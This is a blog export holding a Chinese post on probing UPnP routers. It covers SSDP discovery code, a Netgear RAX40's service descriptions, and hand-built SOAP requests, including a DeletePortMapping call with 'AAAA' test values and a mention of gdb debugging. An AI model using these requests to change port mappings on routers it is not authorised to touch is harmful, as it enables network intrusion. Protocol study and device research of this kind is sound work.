{"meta":{"title":"p1yang","subtitle":"","description":"","author":"p1yang","url":"http://example.com"},"pages":[],"posts":[{"title":"","slug":"iot/协议-upnp","date":"2023-08-29T09:40:36.134Z","updated":"2023-08-29T09:55:42.207Z","comments":true,"path":"article/0.html","link":"","permalink":"http://example.com/article/0.html","excerpt":"","text":"upnp访问过程 #随笔 udp访问239.255.255.250的1900端口，ssdp协议 import socket import re ANY = &quot;0.0.0.0&quot; DES_IP = &quot;239.255.255.250&quot; PORT = 1900 xml_str = b&#x27;M-SEARCH * HTTP/1.1\\r\\n&#x27; \\ \\+ b&#x27;HOST: 239.255.255.250:1900\\r\\n&#x27; \\ \\+ b&#x27;MAN: &quot;ssdp:discover&quot;\\r\\n&#x27; \\ \\+ b&#x27;MX: 1\\r\\n&#x27; \\ \\+ b&#x27;ST: urn:dial-multiscreen-org:service:dial:1\\r\\n&#x27; \\ \\+ b&#x27;USER-AGENT: Google Chrome/87.0.4280.88 Windows\\r\\n\\r\\n\\r\\n&#x27; s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM,socket.IPPROTO_UDP) s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1) s.bind((ANY,PORT)) s.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255) s.setsockopt( socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, socket.inet_aton(DES_IP) + socket.inet_aton(ANY) ) s.setblocking(False) s.sendto(xml_str,(DES_IP,PORT)) while True: try: data, address = s.recvfrom(2048) except Exception as e: pass else: print(address) print(data) 通过这种方式可以获取到同网下的其他upnp设备信息 (&#x27;10.0.0.1&#x27;, 35150) b&#x27;NOTIFY * HTTP/1.1\\r\\nHOST: 239.255.255.250:1900\\r\\nCACHE-CONTROL: max-age=3600\\r\\nLOCATION: http://10.0.0.1:56688/rootDesc.xml\\r\\nSERVER: OpenWRT/OpenWrt UPnP/1.1 MiniUPnPd/2.0\\r\\nNT: upnp:rootdevice\\r\\nUSN: uuid:97fd7581-d522-415d-bfae-a51ac69e4b55::upnp:rootdevice\\r\\nNTS: ssdp:alive\\r\\nOPT: &quot;http://schemas.upnp.org/upnp/1/0/&quot;; ns=01\\r\\n01-NLS: 1693189369\\r\\nBOOTID.UPNP.ORG: 1693189369\\r\\nCONFIGID.UPNP.ORG: 1337\\r\\n\\r\\n&#x27; (&#x27;10.0.0.1&#x27;, 60956) b&#x27;NOTIFY * HTTP/1.1\\r\\nHOST: 239.255.255.250:1900\\r\\nCACHE-CONTROL: max-age=1801\\r\\nNTS: ssdp:alive\\r\\nLOCATION: http://10.0.0.1:49153/wps_device.xml\\r\\nSERVER: Unspecified, UPnP/1.0, Unspecified\\r\\nNT: urn:schemas-wifialliance-org:service:WFAWLANConfig:1\\r\\nUSN: uuid:dd20a05f-a846-47cf-b976-047083022a1d::urn:schemas-wifialliance-org:service:WFAWLANConfig:1\\r\\n\\r\\n&#x27; 现在是以10.0.0.1做演示 信息中能发现LOCATION http://10.0.0.1:49153/wps_device.xml http://10.0.0.1:56688/rootDesc.xml rootDesc.xml文件 This XML file does not appear to have any style information associated with it. The document tree is shown below. &lt;root xmlns=&quot;urn:schemas-upnp-org:device-1-0&quot; configId=&quot;1337&quot;&gt; &lt;specVersion&gt; ​ &lt;major&gt;1&lt;/major&gt; ​ &lt;minor&gt;1&lt;/minor&gt; &lt;/specVersion&gt; &lt;device&gt; ​ &lt;deviceType&gt;urn:schemas-upnp-org:device:InternetGatewayDevice:1&lt;/deviceType&gt; ​ &lt;friendlyName&gt;RAX40 (Gateway)&lt;/friendlyName&gt; ​ &lt;manufacturer&gt;Netgear, Inc.&lt;/manufacturer&gt; ​ &lt;manufacturerURL&gt;http://www.NETGEAR.com&lt;/manufacturerURL&gt; ​ &lt;modelDescription&gt;OpenWRT router&lt;/modelDescription&gt; ​ &lt;modelName&gt;RAX40&lt;/modelName&gt; ​ &lt;modelNumber&gt;RAX40&lt;/modelNumber&gt; ​ &lt;modelURL&gt;http://www.netgear.com/home&lt;/modelURL&gt; ​ &lt;serialNumber&gt;5UP299WPA0C55&lt;/serialNumber&gt; ​ &lt;UDN&gt;uuid:97fd7581-d522-415d-bfae-a51ac69e4b55&lt;/UDN&gt; ​ &lt;serviceList&gt; ​ &lt;service&gt; ​ &lt;serviceType&gt;urn:schemas-upnp-org:service:Layer3Forwarding:1&lt;/serviceType&gt; ​ &lt;serviceId&gt;urn:upnp-org:serviceId:L3Forwarding1&lt;/serviceId&gt; ​ &lt;SCPDURL&gt;/L3F.xml&lt;/SCPDURL&gt; ​ &lt;controlURL&gt;/ctl/L3F&lt;/controlURL&gt; ​ &lt;eventSubURL&gt;/evt/L3F&lt;/eventSubURL&gt; ​ &lt;/service&gt; ​ &lt;/serviceList&gt; ​ &lt;deviceList&gt; ​ &lt;device&gt; ​ &lt;deviceType&gt;urn:schemas-upnp-org:device:WANDevice:1&lt;/deviceType&gt; ​ &lt;friendlyName&gt;WANDevice&lt;/friendlyName&gt; ​ &lt;manufacturer&gt;MiniUPnP&lt;/manufacturer&gt; ​ &lt;manufacturerURL&gt;http://miniupnp.free.fr/&lt;/manufacturerURL&gt; ​ &lt;modelDescription&gt;WAN Device&lt;/modelDescription&gt; ​ &lt;modelName&gt;WAN Device&lt;/modelName&gt; ​ &lt;modelNumber&gt;20220318&lt;/modelNumber&gt; ​ &lt;modelURL&gt;http://miniupnp.free.fr/&lt;/modelURL&gt; ​ &lt;serialNumber&gt;5UP299WPA0C55&lt;/serialNumber&gt; ​ &lt;UDN&gt;uuid:97fd7581-d522-415d-bfae-a51ac69e4b56&lt;/UDN&gt; ​ &lt;UPC&gt;000000000000&lt;/UPC&gt; ​ &lt;serviceList&gt; ​ &lt;service&gt; ​ &lt;serviceType&gt;urn:schemas-upnp-org:service:WANCommonInterfaceConfig:1&lt;/serviceType&gt; ​ &lt;serviceId&gt;urn:upnp-org:serviceId:WANCommonIFC1&lt;/serviceId&gt; ​ &lt;SCPDURL&gt;/WANCfg.xml&lt;/SCPDURL&gt; ​ &lt;controlURL&gt;/ctl/CmnIfCfg&lt;/controlURL&gt; ​ &lt;eventSubURL&gt;/evt/CmnIfCfg&lt;/eventSubURL&gt; ​ &lt;/service&gt; ​ &lt;/serviceList&gt; ​ &lt;deviceList&gt; ​ &lt;device&gt; ​ &lt;deviceType&gt;urn:schemas-upnp-org:device:WANConnectionDevice:1&lt;/deviceType&gt; ​ &lt;friendlyName&gt;WANConnectionDevice&lt;/friendlyName&gt; ​ &lt;manufacturer&gt;MiniUPnP&lt;/manufacturer&gt; ​ &lt;manufacturerURL&gt;http://miniupnp.free.fr/&lt;/manufacturerURL&gt; ​ &lt;modelDescription&gt;MiniUPnP daemon&lt;/modelDescription&gt; ​ &lt;modelName&gt;MiniUPnPd&lt;/modelName&gt; ​ &lt;modelNumber&gt;20220318&lt;/modelNumber&gt; ​ &lt;modelURL&gt;http://miniupnp.free.fr/&lt;/modelURL&gt; ​ &lt;serialNumber&gt;5UP299WPA0C55&lt;/serialNumber&gt; ​ &lt;UDN&gt;uuid:97fd7581-d522-415d-bfae-a51ac69e4b57&lt;/UDN&gt; ​ &lt;UPC&gt;000000000000&lt;/UPC&gt; ​ &lt;serviceList&gt; ​ &lt;service&gt; ​ &lt;serviceType&gt;urn:schemas-upnp-org:service:WANIPConnection:1&lt;/serviceType&gt; ​ &lt;serviceId&gt;urn:upnp-org:serviceId:WANIPConn1&lt;/serviceId&gt; ​ &lt;SCPDURL&gt;/WANIPCn.xml&lt;/SCPDURL&gt; ​ &lt;controlURL&gt;/ctl/IPConn&lt;/controlURL&gt; ​ &lt;eventSubURL&gt;/evt/IPConn&lt;/eventSubURL&gt; ​ &lt;/service&gt; ​ &lt;/serviceList&gt; ​ &lt;/device&gt; ​ &lt;/deviceList&gt; ​ &lt;/device&gt; ​ &lt;/deviceList&gt; ​ &lt;presentationURL&gt;http://www.routerlogin.net&lt;/presentationURL&gt; &lt;/device&gt; &lt;/root&gt; 其中可以获取设备名称制造商各种服务等信息 L3Forwarding1 &lt;service&gt; ​ &lt;serviceType&gt;urn:schemas-upnp-org:service:Layer3Forwarding:1&lt;/serviceType&gt; ​ &lt;serviceId&gt;urn:upnp-org:serviceId:L3Forwarding1&lt;/serviceId&gt; ​ &lt;SCPDURL&gt;/L3F.xml&lt;/SCPDURL&gt; ​ &lt;controlURL&gt;/ctl/L3F&lt;/controlURL&gt; ​ &lt;eventSubURL&gt;/evt/L3F&lt;/eventSubURL&gt; &lt;/service&gt; WANCommonIFC1 &lt;service&gt; ​ &lt;serviceType&gt;urn:schemas-upnp-org:service:WANCommonInterfaceConfig:1&lt;/serviceType&gt; ​ &lt;serviceId&gt;urn:upnp-org:serviceId:WANCommonIFC1&lt;/serviceId&gt; ​ &lt;SCPDURL&gt;/WANCfg.xml&lt;/SCPDURL&gt; ​ &lt;controlURL&gt;/ctl/CmnIfCfg&lt;/controlURL&gt; ​ &lt;eventSubURL&gt;/evt/CmnIfCfg&lt;/eventSubURL&gt; &lt;/service&gt; WANIPConn1 &lt;service&gt; ​ &lt;serviceType&gt;urn:schemas-upnp-org:service:WANIPConnection:1&lt;/serviceType&gt; ​ &lt;serviceId&gt;urn:upnp-org:serviceId:WANIPConn1&lt;/serviceId&gt; ​ &lt;SCPDURL&gt;/WANIPCn.xml&lt;/SCPDURL&gt; ​ &lt;controlURL&gt;/ctl/IPConn&lt;/controlURL&gt; ​ &lt;eventSubURL&gt;/evt/IPConn&lt;/eventSubURL&gt; &lt;/service&gt; 通过访问SCPDURL可以获取服务的具体行为，以WANIPConn1为例 访问http://10.0.0.1:56688/WANIPCn.xml This XML file does not appear to have any style information associated with it. The document tree is shown below. &lt;scpd xmlns=&quot;urn:schemas-upnp-org:service-1-0&quot;&gt; &lt;specVersion&gt; ​ &lt;major&gt;1&lt;/major&gt; ​ &lt;minor&gt;1&lt;/minor&gt; &lt;/specVersion&gt; &lt;actionList&gt; ​ &lt;action&gt; ​ &lt;name&gt;SetConnectionType&lt;/name&gt; ​ &lt;argumentList&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewConnectionType&lt;/name&gt; ​ &lt;direction&gt;in&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;ConnectionType&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;/argumentList&gt; ​ &lt;/action&gt; ​ &lt;action&gt; ​ &lt;name&gt;GetConnectionTypeInfo&lt;/name&gt; ​ &lt;argumentList&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewConnectionType&lt;/name&gt; ​ &lt;direction&gt;out&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;ConnectionType&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewPossibleConnectionTypes&lt;/name&gt; ​ &lt;direction&gt;out&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;PossibleConnectionTypes&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;/argumentList&gt; ​ &lt;/action&gt; ​ &lt;action&gt; ​ &lt;name&gt;RequestConnection&lt;/name&gt; ​ &lt;/action&gt; ​ &lt;action&gt; ​ &lt;name&gt;ForceTermination&lt;/name&gt; ​ &lt;/action&gt; ​ &lt;action&gt; ​ &lt;name&gt;GetStatusInfo&lt;/name&gt; ​ &lt;argumentList&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewConnectionStatus&lt;/name&gt; ​ &lt;direction&gt;out&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;ConnectionStatus&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewLastConnectionError&lt;/name&gt; ​ &lt;direction&gt;out&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;LastConnectionError&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewUptime&lt;/name&gt; ​ &lt;direction&gt;out&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;Uptime&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;/argumentList&gt; ​ &lt;/action&gt; ​ &lt;action&gt; ​ &lt;name&gt;GetNATRSIPStatus&lt;/name&gt; ​ &lt;argumentList&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewRSIPAvailable&lt;/name&gt; ​ &lt;direction&gt;out&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;RSIPAvailable&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewNATEnabled&lt;/name&gt; ​ &lt;direction&gt;out&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;NATEnabled&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;/argumentList&gt; ​ &lt;/action&gt; ​ &lt;action&gt; ​ &lt;name&gt;GetGenericPortMappingEntry&lt;/name&gt; ​ &lt;argumentList&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewPortMappingIndex&lt;/name&gt; ​ &lt;direction&gt;in&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;PortMappingNumberOfEntries&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewRemoteHost&lt;/name&gt; ​ &lt;direction&gt;out&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;RemoteHost&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewExternalPort&lt;/name&gt; ​ &lt;direction&gt;out&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;ExternalPort&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewProtocol&lt;/name&gt; ​ &lt;direction&gt;out&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;PortMappingProtocol&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewInternalPort&lt;/name&gt; ​ &lt;direction&gt;out&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;InternalPort&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewInternalClient&lt;/name&gt; ​ &lt;direction&gt;out&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;InternalClient&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewEnabled&lt;/name&gt; ​ &lt;direction&gt;out&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;PortMappingEnabled&lt;/relatedStateVariable&gt; ​ &lt;/argument ​ &lt;argument&gt; ​ &lt;name&gt;NewPortMappingDescription&lt;/name&gt; ​ &lt;direction&gt;out&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;PortMappingDescription&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewLeaseDuration&lt;/name&gt; ​ &lt;direction&gt;out&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;PortMappingLeaseDuration&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;/argumentList&gt; ​ &lt;/action&gt; ​ &lt;action&gt; ​ &lt;name&gt;GetSpecificPortMappingEntry&lt;/name&gt; ​ &lt;argumentList&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewRemoteHost&lt;/name&gt; ​ &lt;direction&gt;in&lt;/direction ​ &lt;relatedStateVariable&gt;RemoteHost&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewExternalPort&lt;/name&gt; ​ &lt;direction&gt;in&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;ExternalPort&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewProtocol&lt;/name&gt; ​ &lt;direction&gt;in&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;PortMappingProtocol&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewInternalPort&lt;/name&gt; ​ &lt;direction&gt;out&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;InternalPort&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewInternalClient&lt;/name&gt; ​ &lt;direction&gt;out&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;InternalClient&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewEnabled&lt;/name&gt; ​ &lt;direction&gt;out&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;PortMappingEnabled&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewPortMappingDescription&lt;/name&gt; ​ &lt;direction&gt;out&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;PortMappingDescription&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewLeaseDuration&lt;/name&gt; ​ &lt;direction&gt;out&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;PortMappingLeaseDuration&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;/argumentList&gt; ​ &lt;/action&gt; ​ &lt;action&gt; ​ &lt;name&gt;AddPortMapping&lt;/name&gt; ​ &lt;argumentList&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewRemoteHost&lt;/name&gt; ​ &lt;direction&gt;in&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;RemoteHost&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewExternalPort&lt;/name&gt; ​ &lt;direction&gt;in&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;ExternalPort&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewProtocol&lt;/name&gt; ​ &lt;direction&gt;in&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;PortMappingProtocol&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewInternalPort&lt;/name&gt; ​ &lt;direction&gt;in&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;InternalPort&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewInternalClient&lt;/name&gt; ​ &lt;direction&gt;in&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;InternalClient&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewEnabled&lt;/name&gt; ​ &lt;direction&gt;in&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;PortMappingEnabled&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewPortMappingDescription&lt;/name&gt; ​ &lt;direction&gt;in&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;PortMappingDescription&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewLeaseDuration&lt;/name&gt; ​ &lt;direction&gt;in&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;PortMappingLeaseDuration&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;/argumentList&gt; ​ &lt;/action&gt; ​ &lt;action&gt; ​ &lt;name&gt;DeletePortMapping&lt;/name&gt; ​ &lt;argumentList&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewRemoteHost&lt;/name&gt; ​ &lt;direction&gt;in&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;RemoteHost&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewExternalPort&lt;/name&gt; ​ &lt;direction&gt;in&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;ExternalPort&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewProtocol&lt;/name&gt; ​ &lt;direction&gt;in&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;PortMappingProtocol&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;/argumentList&gt; ​ &lt;/action&gt; ​ &lt;action&gt; ​ &lt;name&gt;GetExternalIPAddress&lt;/name&gt; ​ &lt;argumentList&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewExternalIPAddress&lt;/name&gt; ​ &lt;direction&gt;out&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;ExternalIPAddress&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;/argumentList&gt; ​ &lt;/action&gt; &lt;/actionList&gt; &lt;serviceStateTable&gt; ​ &lt;stateVariable sendEvents=&quot;no&quot;&gt; ​ &lt;name&gt;ConnectionType&lt;/name&gt; ​ &lt;dataType&gt;string&lt;/dataType&gt; ​ &lt;defaultValue&gt;IP_Routed&lt;/defaultValue&gt; ​ &lt;/stateVariable&gt; ​ &lt;stateVariable sendEvents=&quot;yes&quot; ​ &lt;name&gt;PossibleConnectionTypes&lt;/name&gt; ​ &lt;dataType&gt;string&lt;/dataType&gt; ​ &lt;allowedValueList&gt; ​ &lt;allowedValue&gt;Unconfigured&lt;/allowedValue&gt; ​ &lt;allowedValue&gt;IP_Routed&lt;/allowedValue&gt; ​ &lt;allowedValue&gt;IP_Bridged&lt;/allowedValue&gt; ​ &lt;/allowedValueList&gt; ​ &lt;/stateVariable&gt; ​ &lt;stateVariable sendEvents=&quot;yes&quot;&gt; ​ &lt;name&gt;ConnectionStatus&lt;/name&gt; ​ &lt;dataType&gt;string&lt;/dataType&gt; ​ &lt;defaultValue&gt;Unconfigured&lt;/defaultValue&gt; ​ &lt;allowedValueList&gt; ​ &lt;allowedValue&gt;Unconfigured&lt;/allowedValue&gt; ​ &lt;allowedValue&gt;Connecting&lt;/allowedValue&gt; ​ &lt;allowedValue&gt;Connected&lt;/allowedValue&gt; ​ &lt;allowedValue&gt;PendingDisconnect&lt;/allowedValue&gt; ​ &lt;allowedValue&gt;Disconnecting&lt;/allowedValue&gt; ​ &lt;allowedValue&gt;Disconnected&lt;/allowedValue&gt; ​ &lt;/allowedValueList&gt; ​ &lt;/stateVariable&gt; ​ &lt;stateVariable sendEvents=&quot;no&quot;&gt; ​ &lt;name&gt;Uptime&lt;/name&gt; ​ &lt;dataType&gt;ui4&lt;/dataType&gt; ​ &lt;/stateVariable&gt; ​ &lt;stateVariable sendEvents=&quot;no&quot;&gt; ​ &lt;name&gt;LastConnectionError&lt;/name&gt; ​ &lt;dataType&gt;string&lt;/dataType&gt; ​ &lt;defaultValue&gt;ERROR_NONE&lt;/defaultValue&gt; ​ &lt;allowedValueList&gt; ​ &lt;allowedValue&gt;ERROR_NONE&lt;/allowedValue&gt; ​ &lt;/allowedValueList&gt; ​ &lt;/stateVariable&gt; ​ &lt;stateVariable sendEvents=&quot;no&quot;&gt; ​ &lt;name&gt;RSIPAvailable&lt;/name&gt; ​ &lt;dataType&gt;boolean&lt;/dataType&gt; ​ &lt;defaultValue&gt;0&lt;/defaultValue&gt; ​ &lt;/stateVariable&gt; ​ &lt;stateVariable sendEvents=&quot;no&quot;&gt; ​ &lt;name&gt;NATEnabled&lt;/name&gt; ​ &lt;dataType&gt;boolean&lt;/dataType&gt; ​ &lt;defaultValue&gt;1&lt;/defaultValue&gt; ​ &lt;/stateVariable&gt; ​ &lt;stateVariable sendEvents=&quot;yes&quot;&gt; ​ &lt;name&gt;ExternalIPAddress&lt;/name&gt; ​ &lt;dataType&gt;string&lt;/dataType&gt; ​ &lt;/stateVariable&gt; ​ &lt;stateVariable sendEvents=&quot;yes&quot;&gt; ​ &lt;name&gt;PortMappingNumberOfEntries&lt;/name&gt; ​ &lt;dataType&gt;ui2&lt;/dataType&gt; ​ &lt;/stateVariable&gt; ​ &lt;stateVariable sendEvents=&quot;no&quot;&gt; ​ &lt;name&gt;PortMappingEnabled&lt;/name&gt; ​ &lt;dataType&gt;boolean&lt;/dataType&gt; ​ &lt;/stateVariable&gt; ​ &lt;stateVariable sendEvents=&quot;no&quot;&gt; ​ &lt;name&gt;PortMappingLeaseDuration&lt;/name&gt; ​ &lt;dataType&gt;ui4&lt;/dataType&gt; ​ &lt;defaultValue&gt;3600&lt;/defaultValue&gt; ​ &lt;allowedValueRange&gt; ​ &lt;minimum&gt;0&lt;/minimum&gt; ​ &lt;maximum&gt;604800&lt;/maximum&gt; ​ &lt;/allowedValueRange&gt; ​ &lt;/stateVariable&gt; ​ &lt;stateVariable sendEvents=&quot;no&quot;&gt; ​ &lt;name&gt;RemoteHost&lt;/name&gt; ​ &lt;dataType&gt;string&lt;/dataType&gt; ​ &lt;/stateVariable&gt; ​ &lt;stateVariable sendEvents=&quot;no&quot;&gt; ​ &lt;name&gt;ExternalPort&lt;/name&gt; ​ &lt;dataType&gt;ui2&lt;/dataType&gt; ​ &lt;/stateVariable&gt; ​ &lt;stateVariable sendEvents=&quot;no&quot;&gt; ​ &lt;name&gt;InternalPort&lt;/name&gt; ​ &lt;dataType&gt;ui2&lt;/dataType&gt; ​ &lt;allowedValueRange&gt; ​ &lt;minimum&gt;1&lt;/minimum&gt; ​ &lt;maximum&gt;65535&lt;/maximum&gt; ​ &lt;/allowedValueRange&gt; ​ &lt;/stateVariable&gt; ​ &lt;stateVariable sendEvents=&quot;no&quot;&gt; ​ &lt;name&gt;PortMappingProtocol&lt;/name&gt; ​ &lt;dataType&gt;string&lt;/dataType&gt; ​ &lt;allowedValueList&gt; ​ &lt;allowedValue&gt;TCP&lt;/allowedValue&gt; ​ &lt;allowedValue&gt;UDP&lt;/allowedValue&gt; ​ &lt;/allowedValueList&gt; ​ &lt;/stateVariable&gt; ​ &lt;stateVariable sendEvents=&quot;no&quot;&gt; ​ &lt;name&gt;InternalClient&lt;/name&gt; ​ &lt;dataType&gt;string&lt;/dataType&gt; ​ &lt;/stateVariable&gt; ​ &lt;stateVariable sendEvents=&quot;no&quot;&gt; ​ &lt;name&gt;PortMappingDescription&lt;/name&gt; ​ &lt;dataType&gt;string&lt;/dataType&gt; ​ &lt;/stateVariable&gt; &lt;/serviceStateTable&gt; &lt;/scpd&gt; 分类统计有以下几种： SetConnectionType,GetConnectionTypeInfo,RequestConnection,ForceTermination,GetStatusInfo,GetNATRSIPStatus,GetGenericPortMappingEntry,GetSpecificPortMappingEntry,AddPortMapping,DeletePortMapping,GetExternalIPAddress 通过构造POST请求，访问controlURL：http://10.0.0.1:56688/ctl/IPConn POST /ctl/IPConn HTTP/1.1 Host: 10.0.0.1:56688 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.62 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6 SOAPAction: &quot;urn:schemas-upnp-org:service:WANIPConnection:1#GetExternalIPAddress&quot; Connection: close Content-Length: 260 &lt;s:Envelope xmlns:s=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; s:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt; ​ &lt;s:Body&gt; ​ &lt;u:GetExternalIPAddress xmlns:u=&quot;urn:schemas-upnp-org:service:WANIPConnection:1&quot;&gt; ​ &lt;/u:GetExternalIPAddress&gt; ​ &lt;/s:Body&gt; &lt;/s:Envelope&gt; 重要的有head中的SOAPAction，构造方式为serviceType#action即：urn:schemas-upnp-org:service:WANIPConnection:1#GetExternalIPAddress post参数来源action中的direction为in的参数，如果只有out参数，即可不用构造post参数，直接获取。 in参数的数据类型在serviceStateTable中可以获取 POST /ctl/IPConn HTTP/1.1 Accept-Encoding: identity User-Agent: Python-urllib/3.11 Host: 10.0.0.1:56688 Content-Length: 358 Content-Type: text/xml; charset=&quot;utf-8&quot; Soapaction: &quot;urn:schemas-upnp-org:service:WANIPConnection:1#DeletePortMapping&quot; Connection: close &lt;s:Envelope xmlns:s=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; s:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt; ​ &lt;s:Body&gt; ​ &lt;u:DeletePortMapping xmlns:u=&quot;urn:schemas-upnp-org:service:WANIPConnection:1&quot;&gt; ​ &lt;NewRemoteHost&gt;AAAA&lt;/NewRemoteHost&gt; ​ &lt;NewExternalPort&gt;AAAA&lt;/NewExternalPort&gt; ​ &lt;NewProtocol&gt;TCP&lt;/NewProtocol&gt; ​ &lt;/u:DeletePortMapping&gt; ​ &lt;/s:Body&gt; &lt;/s:Envelope&gt; 通过gdb调试可以发现，可以获取到 python中又个upnpy库，可以很方便的执行上述步骤。 python3 -m pip install upnpy 使用方式 import upnpy \\#获取upnp upnp = upnpy.UPnP() \\#扫描，返回一个设备列表 devices = upnp.discover() \\#确定设备,两种方式都可以 devide = devices[0] device = upnp.get_igd() \\#获取服务列表 services = device.get_services() \\#确定服务，同两种方式均可 service = services[0] service = device[&#x27;WANPPPConnection.1&#x27;] #service id \\#获取服务的actions，返回一个action列表 service.get_actions() \\#通过service.action[&#x27;name&#x27;]()可以执行 service.GetExternalIPAddress() 